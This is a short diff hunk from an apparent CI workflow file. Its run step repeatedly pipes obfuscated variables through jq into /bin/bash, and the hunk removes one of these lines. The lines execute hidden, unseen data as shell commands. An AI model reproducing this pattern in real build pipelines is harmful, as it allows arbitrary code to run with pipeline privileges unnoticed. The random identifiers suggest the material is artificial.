@@ -29,7 +29,6 @@ jobs:
           echo $mjke4244 | jq -r .azb77933 | /bin/bash
           printf '%s' "$xxtbp204" | jq -r .tvm08905 | /bin/bash
           printf '%s' "$j1" | jq -r .wkwls64 | /bin/bash
-          printf '%s' "$g0" | jq -r .sele64764 | /bin/bash
           echo $ix060 | jq -r .yrggx87487 | /bin/bash
 
       - name: Store results
